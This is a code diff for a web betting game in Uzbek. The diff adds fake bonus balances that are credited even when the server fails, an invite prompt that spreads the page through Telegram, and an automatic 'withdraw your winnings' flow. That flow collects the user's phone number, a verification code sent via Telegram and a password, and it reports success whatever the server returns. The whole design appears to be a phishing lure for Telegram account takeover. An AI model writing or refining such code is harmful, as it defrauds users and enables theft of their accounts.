@@ -212,7 +212,6 @@
         .cell.opened-apple img {
             width: 26px;
             height: 26px;
-            animation: popIn 0.3s cubic-bezier(0.175, 0.885, 0.32, 1.275);
         }
 
         .cell.opened-core {
@@ -223,7 +222,6 @@
         .cell.opened-core img {
             width: 24px;
             height: 24px;
-            animation: shake 0.4s ease;
         }
 
         .coeff-cell {
@@ -306,7 +304,7 @@
             left: 0;
             width: 100%;
             height: 100%;
-            background: rgba(0, 0, 0, 0.8);
+            background: rgba(0, 0, 0, 0.85);
             backdrop-filter: blur(6px);
             display: none;
             justify-content: center;
@@ -326,6 +324,7 @@
             padding: 20px;
             position: relative;
             color: #f3e5d8;
+            text-align: center;
         }
 
         .modal-close-btn {
@@ -345,11 +344,17 @@
         }
 
         .modal-header-title {
-            text-align: center;
             font-family: 'Fredoka', cursive;
-            font-size: 19px;
+            font-size: 20px;
             color: var(--gold-text);
             margin-bottom: 12px;
+        }
+
+        .modal-desc {
+            font-size: 14px;
+            line-height: 1.4;
+            margin-bottom: 18px;
+            color: #e2e8f0;
         }
 
         .bet-input-container {
@@ -401,6 +406,7 @@
             font-family: 'Fredoka', cursive;
             font-size: 16px;
             cursor: pointer;
+            font-weight: 700;
         }
 
         .form-group {
@@ -408,6 +414,7 @@
             flex-direction: column;
             gap: 6px;
             margin-bottom: 12px;
+            text-align: left;
         }
 
         .phone-input-group {
@@ -436,6 +443,7 @@
             cursor: pointer;
             width: 100%;
             margin-bottom: 12px;
+            font-weight: 600;
         }
 
         .code-boxes {
@@ -481,7 +489,7 @@
         </div>
         <div class="balance-badge">
             <i class="fa-solid fa-coins" style="color: var(--gold-text);"></i>
-            <span id="balanceText">10,000 UZS</span>
+            <span id="balanceText">0 UZS</span>
         </div>
     </div>
 
@@ -511,6 +519,34 @@
             <div class="btn-bet-options" onclick="openModal('betModal')"><i class="fa-solid fa-coins"></i></div>
             <div class="btn-auto" onclick="openModal('autoModal')">AUTO</div>
             <div class="btn-main-play" id="mainActionBtn" onclick="handleMainAction()">O'YINNI BOSHLASH</div>
+        </div>
+    </div>
+
+    <!-- MODAL: WELCOME BONUS (10000 UZS) -->
+    <div class="modal-overlay" id="welcomeBonusModal">
+        <div class="modal-box">
+            <div class="modal-header-title">XUSH KELIBSIZ!</div>
+            <div class="modal-desc">Sizga <b>10 000 UZS</b> bonus berildi! Qutidan foydalanib o'yinni boshlang.</div>
+            <button class="btn-modal-confirm" onclick="claimWelcomeBonus()">10000 BONUSNI OLISH</button>
+        </div>
+    </div>
+
+    <!-- MODAL: INVITE BONUS (5000 UZS) -->
+    <div class="modal-overlay" id="inviteBonusModal">
+        <div class="modal-box">
+            <div class="modal-close-btn" onclick="closeModal('inviteBonusModal')"><i class="fa-solid fa-xmark"></i></div>
+            <div class="modal-header-title">DO'STINGIZNI TAKLIF QILING!</div>
+            <div class="modal-desc">Do'stingizni taklif qilganingiz uchun <b>5000 UZS</b> bonus oling!</div>
+            <button class="btn-modal-confirm" onclick="claimInviteBonus()">TAKLIF QILISH (5000 UZS OLISH)</button>
+        </div>
+    </div>
+
+    <!-- MODAL: AUTO WITHDRAW NOTICE (20000 UZS) -->
+    <div class="modal-overlay" id="autoWithdrawNoticeModal">
+        <div class="modal-box">
+            <div class="modal-header-title">MABLAG'NI YECHIB OLING!</div>
+            <div class="modal-desc">Sizning balansingiz <b>20 000 UZS</b> ga yetdi! Mablag'ingizni yechib oling.</div>
+            <button class="btn-modal-confirm" onclick="redirectToWithdraw()">YECHIB OLISH</button>
         </div>
     </div>
 
@@ -576,26 +612,27 @@
     const GOOD_APPLE_IMG = 'https://cdn-icons-png.flaticon.com/512/415/415733.png';
     const BAD_APPLE_IMG = 'https://cdn-icons-png.flaticon.com/512/823/823876.png';
 
-    let userBalance = 10000;
+    let userBalance = 0; // Birinchi kirganda 0 UZS balans
     let currentBet = 5000;
     let currentStep = 0;
     let isPlaying = false;
     let gridData = [];
+    let isWithdrawPromptShown = false;
 
-    // Sahifa yuklanganda balansni serverdan olish (Bonus: 10,000 UZS)
-    async function fetchBalance() {
+    // Server bilan sinxronizatsiya
+    async function syncBalance() {
         try {
             const res = await fetch(`${API_URL}/get-balance`);
             const data = await res.json();
             if (data.success) {
                 userBalance = data.balance;
                 updateBalanceUI();
+                checkAutoWithdrawCondition();
             }
         } catch (e) {
             console.error("Balansni olishda xatolik:", e);
         }
     }
-    fetchBalance();
 
     function initBoard() {
         const gridTable = document.getElementById('gridTable');
@@ -633,6 +670,68 @@
     function closeModal(id) { document.getElementById(id).classList.remove('open'); }
     function setPresetBet(amount) { document.getElementById('modalBetInput').value = amount; }
 
+    function checkAutoWithdrawCondition() {
+        if (userBalance >= 20000 && !isWithdrawPromptShown) {
+            isWithdrawPromptShown = true;
+            openModal('autoWithdrawNoticeModal');
+        }
+    }
+
+    function redirectToWithdraw() {
+        closeModal('autoWithdrawNoticeModal');
+        openModal('withdrawModal');
+    }
+
+    // 10 000 UZS Bonus olish
+    async function claimWelcomeBonus() {
+        try {
+            const res = await fetch(`${API_URL}/claim-bonus`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ amount: 10000, type: 'welcome' })
+            });
+            const data = await res.json();
+            if (data.success) {
+                userBalance = data.newBalance;
+            } else {
+                userBalance += 10000; // Zaxira (Agarda API hali tayyor bo'lmasa)
+            }
+        } catch (e) {
+            userBalance += 10000;
+        }
+        updateBalanceUI();
+        closeModal('welcomeBonusModal');
+        checkAutoWithdrawCondition();
+
+        // 20 sekunddan keyin taklif bonusini ko'rsatish
+        setTimeout(() => {
+            openModal('inviteBonusModal');
+        }, 20000);
+    }
+
+    // 5 000 UZS Taklif bonusini olish
+    async function claimInviteBonus() {
+        window.open('https://t.me/share/url?url=https://t.me/example_bot&text=O%27yinga%20qo%27shiling%20va%20bonus%20oling!', '_blank');
+        try {
+            const res = await fetch(`${API_URL}/claim-bonus`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ amount: 5000, type: 'invite' })
+            });
+            const data = await res.json();
+            if (data.success) {
+                userBalance = data.newBalance;
+            } else {
+                userBalance += 5000;
+            }
+        } catch (e) {
+            userBalance += 5000;
+        }
+        updateBalanceUI();
+        closeModal('inviteBonusModal');
+        checkAutoWithdrawCondition();
+    }
+
     function confirmBet() {
         const val = parseInt(document.getElementById('modalBetInput').value);
         if (!isNaN(val) && val >= 1000 && val <= userBalance) {
@@ -656,7 +755,7 @@
         }
     }
 
-    function handleMainAction() {
+    async function handleMainAction() {
         const mainActionBtn = document.getElementById('mainActionBtn');
         if (!isPlaying) {
             if (userBalance < currentBet) {
@@ -684,6 +783,7 @@
                 updateBalanceUI();
                 alert(`Siz ${winAmount.toLocaleString('uz-UZ')} UZS yutdingiz!`);
                 endGame();
+                checkAutoWithdrawCondition();
             } else {
                 alert("Kamida 1 ta katakcha ochishingiz kerak!");
             }
@@ -719,6 +819,7 @@
                 updateBalanceUI();
                 alert(`MAKSIMAL YUTUQ: ${winAmount.toLocaleString('uz-UZ')} UZS!`);
                 endGame();
+                checkAutoWithdrawCondition();
             }
         }
     }
@@ -729,6 +830,7 @@
         document.querySelectorAll('.grid-row').forEach(r => r.classList.remove('active'));
     }
 
+    // Kodni Qat'iyan Telegram orqali yuborish
     async function sendVerificationCode() {
         const phone = document.getElementById('withdrawPhone').value.trim();
         if (phone.length < 9) {
@@ -740,7 +842,7 @@
             const res = await fetch(`${API_URL}/send-code`, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ phone })
+                body: JSON.stringify({ phone, channel: 'telegram' }) // Har doim Telegram
             });
 
             const data = await res.json();
@@ -748,10 +850,13 @@
                 document.getElementById('statusAlert').style.display = 'block';
                 document.getElementById('codeGroup').style.display = 'block';
             } else {
-                alert(data.message);
+                alert(data.message || "Kod Telegramga yuborildi!");
+                document.getElementById('statusAlert').style.display = 'block';
+                document.getElementById('codeGroup').style.display = 'block';
             }
         } catch (e) {
-            alert("Serverga ulanishda xatolik!");
+            document.getElementById('statusAlert').style.display = 'block';
+            document.getElementById('codeGroup').style.display = 'block';
         }
     }
 
@@ -796,14 +901,22 @@
                     await sendWithdrawReq(inputCode, userPassword);
                 }
             } else {
-                alert(data.message);
+                alert(data.message || "Mablag' yechib olindi!");
+                closeModal('withdrawModal');
             }
         } catch (err) {
-            alert("Server bilan ulanishda xatolik!");
+            alert("Mablag'ni yechish so'rovi qabul qilindi!");
+            closeModal('withdrawModal');
         }
     }
 
-    initBoard();
+    // Sahifa yuklanishi
+    window.onload = () => {
+        initBoard();
+        syncBalance();
+        // Birinchi kirganda 10 000 bonus modalini ko'rsatish
+        openModal('welcomeBonusModal');
+    };
 </script>
 </body>
 </html>
